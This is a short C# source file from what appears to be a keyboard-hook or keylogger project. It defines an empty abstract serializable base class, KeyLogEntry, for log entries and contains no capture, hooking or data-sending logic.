using System;

namespace KeyBoardHook.KeyLogger.Entity
{
    [Serializable]
    public abstract class KeyLogEntry
    {
        public abstract override string ToString();
    }
}